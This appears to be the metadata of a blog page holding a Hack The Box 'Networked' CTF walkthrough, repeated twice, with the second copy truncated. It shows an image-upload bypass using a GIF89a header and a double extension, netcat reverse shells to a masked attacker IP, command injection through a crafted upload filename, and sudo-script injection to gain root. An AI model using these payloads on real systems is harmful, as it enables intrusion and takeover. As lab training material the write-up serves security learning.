<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Networked" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="I really learnt a lot from this box such as the double extension attack and passing of variables into the environment of a command in bash. The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.146 networked.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ nmap -sV -sT -sC networked.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-31 11:49 EDT Nmap scan report for networked.htb (10.10.10.146) Host is up (0.27s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: |_ 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 443/tcp closed https Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 144.41 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, lets see if we can gather any information or exploit it ? Enumeration (1) index.php: 1 2 3 Hello mate, we&#39;re building the new FaceMash! Help by funding us and be the new Tyler&amp;Cameron! Join us at the pool party this Sat to get a glimpse Doesn’t seem like much but if we inspect the source: 1 2 3 4 5 6 7 8 &lt;html&gt; &lt;body&gt; Hello mate, we&#39;re building the new FaceMash!&lt;/br&gt; Help by funding us and be the new Tyler&amp;Cameron!&lt;/br&gt; Join us at the pool party this Sat to get a glimpse &lt;!-- upload and gallery not yet linked --&gt; &lt;/body&gt; &lt;/html&gt; Hm… upload and gallery? Unfortunately, appending them to the URL gives us a 404. Looks like we have to brute force the directory and files. I will be using gobuster: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ gobuster dir -u http://networked.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://networked.htb [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/08/31 21:54:19 Starting gobuster =============================================================== /uploads (Status: 301) /backup (Status: 301) =============================================================== 2019/08/31 21:59:28 Finished =============================================================== On /backup we get a directory listing which only contains backup.tar. After downloading backup.tar, we extract all of its contents. 1 2 3 4 5 $ tar -xvf backup.tar index.php lib.php photos.php upload.php Seems like the contents of web server? Maybe this is a backup of the current web server? upload.php: photos.php: Lets try to upload an image into the web server! We clicked on Browse, selected our picture and hit go!. Done! If we visit photos.php again, We see a new picture which has a name containing our IP address but with the periods replaced with underscores. Another thing to note is that the extensions were maintained as well. Since we can upload files onto the server, lets try to upload a .php file which will establish a reverse connection by to our listener! 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... reverseconn.php: 1 2 3 &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/f&#39;); ?&gt; Looks like our file got rejected :( Since we already have the source code for upload.php, lets check it out. The first to look at is this: 1 2 3 4 5 6 7 $myFile = $_FILES[&quot;myFile&quot;]; if (!(check_file_type($_FILES[&quot;myFile&quot;]) &amp;&amp; filesize($_FILES[&#39;myFile&#39;][&#39;tmp_name&#39;]) &lt; 60000)) { echo &#39;&lt;pre&gt;Invalid image file.&lt;/pre&gt;&#39;; displayform(); } Since we know our file doesnt exceed 60Mb, we can focus on check_file_type. This function is located in lib.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 function check_file_type($file) { $mime_type = file_mime_type($file); if (strpos($mime_type, &#39;image/&#39;) === 0) { return true; } else { return false; } } function file_mime_type($file) { $regexp = &#39;/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/&#39;; if (function_exists(&#39;finfo_file&#39;)) { $finfo = finfo_open(FILEINFO_MIME); if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system { $mime = @finfo_file($finfo, $file[&#39;tmp_name&#39;]); finfo_close($finfo); if (is_string($mime) &amp;&amp; preg_match($regexp, $mime, $matches)) { $file_type = $matches[1]; return $file_type; } } } if (function_exists(&#39;mime_content_type&#39;)) { $file_type = @mime_content_type($file[&#39;tmp_name&#39;]); if (strlen($file_type) &gt; 0) // It&#39;s possible that mime_content_type() returns FALSE or an empty string { return $file_type; } } return $file[&#39;type&#39;]; } Judging from the code, it seems like it is checking the MIME Content-type of the file. Examples of MIME Content-types include image/jpeg, text/html, application/json. This is done by checking the file header bytes and using a MIME database file to determine the Content-Type. Looks like the Content-Type needs to contain image/, such as image/png, image/jpeg and image/gif. With this knowledge, we know that we need to trick the web server into thinking our file is an image. This can actually be done by prepending GIF89a to reverseconn.php! 1 2 3 4 GIF89a &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/f&#39;); ?&gt; To find out if it works, we use the file command, which uses the same way to determine the file type. 1 2 $ file reverseconn.php reverseconn.php: GIF image data 16188 x 26736 Isn’t that magical? XD Next up, we have another section that checks the extension of the file against a list of image extensions. 1 2 3 4 5 6 7 8 list ($foo,$ext) = getnameUpload($myFile[&quot;name&quot;]); $validext = array(&#39;.jpg&#39;, &#39;.png&#39;, &#39;.gif&#39;, &#39;.jpeg&#39;); $valid = false; foreach ($validext as $vext) { if (substr_compare($myFile[&quot;name&quot;], $vext, -strlen($vext)) === 0) { $valid = true; } } If we renamed our file from reverseconn.php to reverseconn.jpeg and try to upload it, the file will be uploaded successfully. However, the file will be treated as an image by the web server. The function that returns the extension of the file is getnameUpload, which is located in lib.php. 1 2 3 4 5 6 7 function getnameUpload($filename) { $pieces = explode(&#39;.&#39;,$filename); $name= array_shift($pieces); $name = str_replace(&#39;_&#39;,&#39;.&#39;,$name); $ext = implode(&#39;.&#39;,$pieces); return array($name,$ext); } After reading the code, we understand that the extension taken from the second period onwards. So if our file name is reverseconn.php.jpeg, the extension will be returned will be .php.jpeg. Lets rename our file to reverseconn.php.jpeg to see what happens. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 36758 sh: no job control in this shell sh-4.2$ whoami apache Alright it worked! But why? Shouldn’t the file still be treated as .jpeg file since it ends with it? Since we already have a shell as apache, lets check out the config for the apache service. /etc/httpd/conf.d/php.conf: 1 AddHandler php5-script .php According to apache’s documentation, if more than one extension is given that maps onto the same type of metadata, then the one to the right will be used, which would mean that .jpeg will be used in this case. However, due to the line in php.conf, any file with the name containing .php will be treated as a PHP script by the web server. Continuing on, lets see what other users are available on the machine. 1 2 3 sh-4.2$ ls /home ls /home guly However when we try to read user.txt, 1 2 3 sh-4.2$ cat /home/guly/user.txt cat /home/guly/user.txt cat: /home/guly/user.txt: Permission denied Looks like we need to log in as user guly. If we check the home directory of guly, 1 2 3 4 5 sh-4.2$ ls /home/guly ls check_attack.php crontab.guly user.txt Checking crontab.guly, 1 */3 * * * * php /home/guly/check_attack.php It contains a crontab entry which runs the check_attack.php script every 3 minutes. Checking check_attack.php, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 &lt;?php require &#39;/var/www/html/lib.php&#39;; $path = &#39;/var/www/html/uploads/&#39;; $logpath = &#39;/tmp/attack.log&#39;; $to = &#39;guly&#39;; $msg= &#39;&#39;; $headers = &quot;X-Mailer: check_attack.php\r\n&quot;; $files = array(); $files = preg_grep(&#39;/^([^.])/&#39;, scandir($path)); foreach ($files as $key =&gt; $value) { $msg=&#39;&#39;; if ($value == &#39;index.html&#39;) { continue; } #echo &quot;-------------\n&quot;; #print &quot;check: $value\n&quot;; list ($name,$ext) = getnameCheck($value); $check = check_ip($name,$value); if (!($check[0])) { echo &quot;attack!\n&quot;; # todo: attach file file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX); exec(&quot;rm -f $logpath&quot;); exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;); echo &quot;rm -f $path$value\n&quot;; mail($to, $msg, $msg, $headers, &quot;-F$value&quot;); } } ?&gt; It scans for all files in the /var/www/html/uploads folder, extract the file names without the extensions and check each one of them if they match the naming format that upload.php uses, which means that it has to look like 10_10_XXX_XXX.png or 127_0_0_1.png. And if they don’t, it will be logged as an attack attempt and certain commands will be executed. The best part? Looks like we can inject some commands using the $value variable, which is the filename of the file. Lets create another listener 1 2 $ nc -lvnp 1338 listening on [any] 1338 ... and create a file in /var/www/html/uploads/ with a very specially crafted name. 1 sh-4.2$ touch &quot;/var/www/html/uploads/; nc -c bash 10.10.XXX.XXX 1338;&quot; With this file name, it will definitely be logged as an attack attempt and trigger the command to be executed. user.txt After a while (due to the check_attack.php running every 3 minutes), we get a shell. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 39656 python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; [guly@networked ~]$ cat user.txt 526cXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) To quickly enumerate for possible privilege escalation vectors, I will using LinEnum. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Networked machine: 1 2 3 4 5 6 [guly@networked ~]$ cd /tmp [guly@networked /tmp]$ curl http://10.10.XXX.XXX/LinEnum.sh &gt; LinEnum.sh curl 10.10.XX.XX/LinEnum.sh &gt; LinEnum.sh % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 45651 100 45651 0 0 41674 0 0:00:01 0:00:01 --:--:-- 41690 When I ran it, I saw something interesting! 1 2 3 4 5 6 7 8 9 [guly@networked /tmp]$ chmod 777 LinEnum.sh [guly@networked /tmp]$ ./LinEnum.sh ... User guly may run the following commands on networked: (root) NOPASSWD: /usr/local/sbin/changename.sh [+] Possible sudo pwnage! /usr/local/sbin/changename.sh That was easy. This means that we can just sudo /usr/local/sbin/changename.sh and be on our jolly way. But here comes the tough part. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/bin/bash -p cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF regexp=&quot;^[a-zA-Z0-9_\ /-]+$&quot; for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo &quot;interface $var:&quot; read x while [[ ! $x =~ $regexp ]]; do echo &quot;wrong input, try again&quot; echo &quot;interface $var:&quot; read x done echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly done /sbin/ifup guly0 Before we start analysing, lets run it first. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [guly@networked /tmp]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: test test interface PROXY_METHOD: test test interface BROWSER_ONLY: test test interface BOOTPROTO: test test ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. Looks like something went wrong? According to changename.sh, it was reading values for different fields like NAME, PROXY_METHOD etc and writing them into /etc/sysconfig/network-scripts/ifcfg-guly in the given format FIELD=VALUE. /etc/sysconfig/network-scripts/ifcfg-guly: 1 2 3 4 5 6 7 DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no NAME=test PROXY_METHOD=test BROWSER_ONLY=test BOOTPROTO=test I wasn’t sure how we can inject commands using this script but as I was fuzzing with different values, I saw a new error. 1 2 3 4 5 6 7 8 9 [guly@networked ~]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: a a a a ... /etc/sysconfig/network-scripts/ifcfg-guly: line 4: a: command not found ... ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. Our input is being executed ? Lets try to rerun it but insert a command instead. 1 2 3 4 5 6 7 8 [guly@networked ~]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: a whoami ... root ... ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. Nice! Now we know where to inject our commands, we proceed to establish our reverse shell connection. However, since our input cannot contain periods (.), we can create a script that contains our reverse shell commands and execute it instead. On my machine, we start another listener. 1 2 $ nc -lvnp 1339 listening on [any] 1339 ... Then, on the Networked machine, 1 2 3 4 5 6 7 8 [guly@networked /tmp]$ echo &quot;rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1339 &gt;/tmp/g&quot; &gt; runme [guly@networked /tmp]$ chmod 777 runme [guly@networked /tmp]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: a /tmp/runme ... ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. root.txt Back on our machine, we caught the reverse shell connection. 1 2 3 4 5 6 7 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 51618 sh: no job control in this shell sh-4.2# whoami whoami root sh-4.2# cat /root/root.txt 0a8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles ! Extras I went on to study how was /etc/sysconfig/network-scripts/ifcfg-guly was being used when /sbin/ifup guly0 was executed and it actually explains why commands can be injected. /sbin/ifup guly0 1 2 3 4 5 6 7 8 9 #!/bin/bash ... cd /etc/sysconfig/network-scripts . ./network-functions ... CONFIG=${1} ... source_config ... There was one line which was calling source_config, which is a function imported from /etc/sysconfig/network-scripts/network-functions. How was the function imported? This is where I also learnt that . &lt;command&gt; is actually the same as source &lt;command&gt;, which reads and execute commands in the &lt;command&gt; file, essentially importing the functions in there too. 1 2 3 4 5 6 7 source_config () { CONFIG=${CONFIG##*/} ... . /etc/sysconfig/network-scripts/$CONFIG ... } In source_config, the corresponding config file (ifcfg-guly) in /etc/sysconfig/network-scripts is imported, which calls all the variable assignments lines and this is where commands can be injected into. When VAR=VALUE is executed, you are assigning VALUE to VAR to the shell. However, when VAR=VALUE &lt;command&gt; is executed, VALUE is assigned to VAR only in the environment context of the &lt;command&gt; and the &lt;command&gt; is executed! So when we injected our command, it will be saved as NAME=a /tmp/runme, which result in /tmp/runme being ran!" /><meta property="og:description" content="I really learnt a lot from this box such as the double extension attack and passing of variables into the environment of a command in bash. The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.146 networked.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ nmap -sV -sT -sC networked.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-31 11:49 EDT Nmap scan report for networked.htb (10.10.10.146) Host is up (0.27s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: |_ 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 443/tcp closed https Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 144.41 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, lets see if we can gather any information or exploit it ? Enumeration (1) index.php: 1 2 3 Hello mate, we&#39;re building the new FaceMash! Help by funding us and be the new Tyler&amp;Cameron! Join us at the pool party this Sat to get a glimpse Doesn’t seem like much but if we inspect the source: 1 2 3 4 5 6 7 8 &lt;html&gt; &lt;body&gt; Hello mate, we&#39;re building the new FaceMash!&lt;/br&gt; Help by funding us and be the new Tyler&amp;Cameron!&lt;/br&gt; Join us at the pool party this Sat to get a glimpse &lt;!-- upload and gallery not yet linked --&gt; &lt;/body&gt; &lt;/html&gt; Hm… upload and gallery? Unfortunately, appending them to the URL gives us a 404. Looks like we have to brute force the directory and files. I will be using gobuster: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ gobuster dir -u http://networked.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://networked.htb [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/08/31 21:54:19 Starting gobuster =============================================================== /uploads (Status: 301) /backup (Status: 301) =============================================================== 2019/08/31 21:59:28 Finished =============================================================== On /backup we get a directory listing which only contains backup.tar. After downloading backup.tar, we extract all of its contents. 1 2 3 4 5 $ tar -xvf backup.tar index.php lib.php photos.php upload.php Seems like the contents of web server? Maybe this is a backup of the current web server? upload.php: photos.php: Lets try to upload an image into the web server! We clicked on Browse, selected our picture and hit go!. Done! If we visit photos.php again, We see a new picture which has a name containing our IP address but with the periods replaced with underscores. Another thing to note is that the extensions were maintained as well. Since we can upload files onto the server, lets try to upload a .php file which will establish a reverse connection by to our listener! 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... reverseconn.php: 1 2 3 &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/f&#39;); ?&gt; Looks like our file got rejected :( Since we already have the source code for upload.php, lets check it out. The first to look at is this: 1 2 3 4 5 6 7 $myFile = $_FILES[&quot;myFile&quot;]; if (!(check_file_type($_FILES[&quot;myFile&quot;]) &amp;&amp; filesize($_FILES[&#39;myFile&#39;][&#39;tmp_name&#39;]) &lt; 60000)) { echo &#39;&lt;pre&gt;Invalid image file.&lt;/pre&gt;&#39;; displayform(); } Since we know our file doesnt exceed 60Mb, we can focus on check_file_type. This function is located in lib.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 function check_file_type($file) { $mime_type = file_mime_type($file); if (strpos($mime_type, &#39;image/&#39;) === 0) { return true; } else { return false; } } function file_mime_type($file) { $regexp = &#39;/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/&#39;; if (function_exists(&#39;finfo_file&#39;)) { $finfo = finfo_open(FILEINFO_MIME); if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system { $mime = @finfo_file($finfo, $file[&#39;tmp_name&#39;]); finfo_close($finfo); if (is_string($mime) &amp;&amp; preg_match($regexp, $mime, $matches)) { $file_type = $matches[1]; return $file_type; } } } if (function_exists(&#39;mime_content_type&#39;)) { $file_type = @mime_content_type($file[&#39;tmp_name&#39;]); if (strlen($file_type) &gt; 0) // It&#39;s possible that mime_content_type() returns FALSE or an empty string { return $file_type; } } return $file[&#39;type&#39;]; } Judging from the code, it seems like it is checking the MIME Content-type of the file. Examples of MIME Content-types include image/jpeg, text/html, application/json. This is done by checking the file header bytes and using a MIME database file to determine the Content-Type. Looks like the Content-Type needs to contain image/, such as image/png, image/jpeg and image/gif. With this knowledge, we know that we need to trick the web server into thinking our file is an image. This can actually be done by prepending GIF89a to reverseconn.php! 1 2 3 4 GIF89a &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/f&#39;); ?&gt; To find out if it works, we use the file command, which uses the same way to determine the file type. 1 2 $ file reverseconn.php reverseconn.php: GIF image data 16188 x 26736 Isn’t that magical? XD Next up, we have another section that checks the extension of the file against a list of image extensions. 1 2 3 4 5 6 7 8 list ($foo,$ext) = getnameUpload($myFile[&quot;name&quot;]); $validext = array(&#39;.jpg&#39;, &#39;.png&#39;, &#39;.gif&#39;, &#39;.jpeg&#39;); $valid = false; foreach ($validext as $vext) { if (substr_compare($myFile[&quot;name&quot;], $vext, -strlen($vext)) === 0) { $valid = true; } } If we renamed our file from reverseconn.php to reverseconn.jpeg and try to upload it, the file will be uploaded successfully. However, the file will be treated as an image by the web server. The function that returns the extension of the file is getnameUpload, which is located in lib.php. 1 2 3 4 5 6 7 function getnameUpload($filename) { $pieces = explode(&#39;.&#39;,$filename); $name= array_shift($pieces); $name = str_replace(&#39;_&#39;,&#39;.&#39;,$name); $ext = implode(&#39;.&#39;,$pieces); return array($name,$ext); } After reading the code, we understand that the extension taken from the second period onwards. So if our file name is reverseconn.php.jpeg, the extension will be returned will be .php.jpeg. Lets rename our file to reverseconn.php.jpeg to see what happens. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 36758 sh: no job control in this shell sh-4.2$ whoami apache Alright it worked! But why? Shouldn’t the file still be treated as .jpeg file since it ends with it? Since we already have a shell as apache, lets check out the config for the apache service. /etc/httpd/conf.d/php.conf: 1 AddHandler php5-script .php According to apache’s documentation, if more than one extension is given that maps onto the same type of metadata, then the one to the right will be used, which would mean that .jpeg will be used in this case. However, due to the line in php.conf, any file with the name containing .php will be treated as a PHP script by the web server. Continuing on, lets see what other users are available on the machine. 1 2 3 sh-4.2$ ls /home ls /home guly However when we try to read user.txt, 1 2 3 sh-4.2$ cat /home/guly/user.txt cat /home/guly/user.txt cat: /home/guly/user.txt: Permission denied Looks like we need to log in as user guly. If we check the home directory of guly, 1 2 3 4 5 sh-4.2$ ls /home/guly ls check_attack.php crontab.guly user.txt Checking crontab.guly, 1 */3 * * * * php /home/guly/check_attack.php It contains a crontab entry which runs the check_attack.php script every 3 minutes. Checking check_attack.php, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 &lt;?php require &#39;/var/www/html/lib.php&#39;; $path = &#39;/var/www/html/uploads/&#39;; $logpath = &#39;/tmp/attack.log&#39;; $to = &#39;guly&#39;; $msg= &#39;&#39;; $headers = &quot;X-Mailer: check_attack.php\r\n&quot;; $files = array(); $files = preg_grep(&#39;/^([^.])/&#39;, scandir($path)); foreach ($files as $key =&gt; $value) { $msg=&#39;&#39;; if ($value == &#39;index.html&#39;) { continue; } #echo &quot;-------------\n&quot;; #print &quot;check: $value\n&quot;; list ($name,$ext) = getnameCheck($value); $check = check_ip($name,$value); if (!($check[0])) { echo &quot;attack!\n&quot;; # todo: attach file file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX); exec(&quot;rm -f $logpath&quot;); exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;); echo &quot;rm -f $path$value\n&quot;; mail($to, $msg, $msg, $headers, &quot;-F$value&quot;); } } ?&gt; It scans for all files in the /var/www/html/uploads folder, extract the file names without the extensions and check each one of them if they match the naming format that upload.php uses, which means that it has to look like 10_10_XXX_XXX.png or 127_0_0_1.png. And if they don’t, it will be logged as an attack attempt and certain commands will be executed. The best part? Looks like we can inject some commands using the $value variable, which is the filename of the file. Lets create another listener 1 2 $ nc -lvnp 1338 listening on [any] 1338 ... and create a file in /var/www/html/uploads/ with a very specially crafted name. 1 sh-4.2$ touch &quot;/var/www/html/uploads/; nc -c bash 10.10.XXX.XXX 1338;&quot; With this file name, it will definitely be logged as an attack attempt and trigger the command to be executed. user.txt After a while (due to the check_attack.php running every 3 minutes), we get a shell. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 39656 python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; [guly@networked ~]$ cat user.txt 526cXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) To quickly enumerate for possible privilege escalation vectors, I will using LinEnum. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Networked machine: 1 2 3 4 5 6 [guly@networked ~]$ cd /tmp [guly@networked /tmp]$ curl http://10.10.XXX.XXX/LinEnum.sh &gt; LinEnum.sh curl 10.10.XX.XX/LinEnum.sh &gt; LinEnum.sh % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 45651 100 45651 0 0 41674 0 0:00:01 0:00:01 --:--:-- 41690 When I ran it, I saw something interesting! 1 2 3 4 5 6 7 8 9 [guly@networked /tmp]$ chmod 777 LinEnum.sh [guly@networked /tmp]$ ./LinEnum.sh ... User guly may run the following commands on networked: (root) NOPASSWD: /usr/local/sbin/changename.sh [+] Possible sudo pwnage! /usr/local/sbin/changename.sh That was easy. This means that we can just sudo /usr/local/sbin/changename.sh and be on our jolly way. But here comes the tough part. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/bin/bash -p cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF regexp=&quot;^[a-zA-Z0-9_\ /-]+$&quot; for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo &quot;interface $var:&quot; read x while [[ ! $x =~ $regexp ]]; do echo &quot;wrong input, try again&quot; echo &quot;interface $var:&quot; read x done echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly done /sbin/ifup guly0 Before we start analysing, lets run it first. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [guly@networked /tmp]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: test test interface PROXY_METHOD: test test interface BROWSER_ONLY: test test interface BOOTPROTO: test test ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. Looks like something went wrong? According to changename.sh, it was reading values for different fields like NAME, PROXY_METHOD etc and writing them into /etc/sysconfig/network-scripts/ifcfg-guly in the given format FIELD=VALUE. /etc/sysconfig/network-scripts/ifcfg-guly: 1 2 3 4 5 6 7 DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no NAME=test PROXY_METHOD=test BROWSER_ONLY=test BOOTPROTO=test I wasn’t sure how we can inject commands using this script but as I was fuzzing with different values, I saw a new error. 1 2 3 4 5 6 7 8 9 [guly@networked ~]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: a a a a ... /etc/sysconfig/network-scripts/ifcfg-guly: line 4: a: command not found ... ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. Our input is being executed ? Lets try to rerun it but insert a command instead. 1 2 3 4 5 6 7 8 [guly@networked ~]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: a whoami ... root ... ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. Nice! Now we know where to inject our commands, we proceed to establish our reverse shell connection. However, since our input cannot contain periods (.), we can create a script that contains our reverse shell commands and execute it instead. On my machine, we start another listener. 1 2 $ nc -lvnp 1339 listening on [any] 1339 ... Then, on the Networked machine, 1 2 3 4 5 6 7 8 [guly@networked /tmp]$ echo &quot;rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1339 &gt;/tmp/g&quot; &gt; runme [guly@networked /tmp]$ chmod 777 runme [guly@networked /tmp]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: a /tmp/runme ... ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. root.txt Back on our machine, we caught the reverse shell connection. 1 2 3 4 5 6 7 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 51618 sh: no job control in this shell sh-4.2# whoami whoami root sh-4.2# cat /root/root.txt 0a8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles ! Extras I went on to study how was /etc/sysconfig/network-scripts/ifcfg-guly was being used when /sbin/ifup guly0 was executed and it actually explains why commands can be injected. /sbin/ifup guly0 1 2 3 4 5 6 7 8 9 #!/bin/bash ... cd /etc/sysconfig/network-scripts . ./network-functions ... CONFIG=${1} ... source_config ... There was one line which was calling source_config, which is a function imported from 